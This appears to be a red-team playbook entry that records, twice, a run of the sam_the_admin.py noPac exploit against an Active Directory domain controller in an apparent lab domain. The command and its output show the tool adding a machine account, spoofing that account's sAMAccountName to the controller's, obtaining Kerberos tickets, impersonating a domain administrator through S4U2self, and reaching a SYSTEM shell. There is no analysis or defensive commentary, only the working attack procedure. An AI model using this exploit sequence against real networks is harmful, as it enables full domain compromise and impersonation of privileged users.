---
id: a8d23507-a4cf-4dc9-b7b3-b2486c611272
name: Impersonating gaylene.dreddy
type: command
executor: bash
data: "$ python3 sam_the_admin.py \"domain/user:password\" -dc-ip 10.10.10.10 -shell\n\
  [*] Selected Target dc.caltech.white                                           \
  \   \n[*] Total Domain Admins 11                                               \
  \         \n[*] will try to impersonat gaylene.dreddy                          \
  \               \n[*] Current ms-DS-MachineAccountQuota = 10                   \
  \                     \n[*] Adding Computer Account \"SAMTHEADMIN-11$\"        \
  \                             \n[*] MachineAccount \"SAMTHEADMIN-11$\" password\
  \ = EhFMT%mzmACL                      \n[*] Successfully added machine account SAMTHEADMIN-11$\
  \ with password EhFMT%mzmACL.\n[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white\
  \   \n[*] SAMTHEADMIN-11$ sAMAccountName == dc                                 \
  \         \n[*] Saving ticket in dc.ccache                                     \
  \               \n[*] Resting the machine account to SAMTHEADMIN-11$           \
  \                     \n[*] Restored SAMTHEADMIN-11$ sAMAccountName to original\
  \ value                     \n[*] Using TGT from cache                         \
  \                                 \n[*] Impersonating gaylene.dreddy           \
  \                                       \n[*]     Requesting S4U2self          \
  \                                             \n[*] Saving ticket in gaylene.dreddy.ccache\
  \                                        \n[!] Launching semi-interactive shell\
  \ - Careful what you execute                   \nC:\\Windows\\system32>whoami  \
  \                                                      \nnt authority\\system "
output: null
created_at: '2023-04-06T03:56:03.186152+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
---

# Impersonating gaylene.dreddy

```bash
$ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
[*] Selected Target dc.caltech.white                                              
[*] Total Domain Admins 11                                                        
[*] will try to impersonat gaylene.dreddy                                         
[*] Current ms-DS-MachineAccountQuota = 10                                        
[*] Adding Computer Account "SAMTHEADMIN-11$"                                     
[*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
[*] Saving ticket in dc.ccache                                                    
[*] Resting the machine account to SAMTHEADMIN-11$                                
[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
[*] Using TGT from cache                                                          
[*] Impersonating gaylene.dreddy                                                  
[*]     Requesting S4U2self                                                       
[*] Saving ticket in gaylene.dreddy.ccache                                        
[!] Launching semi-interactive shell - Careful what you execute                   
C:\Windows\system32>whoami                                                        
nt authority\system 
```
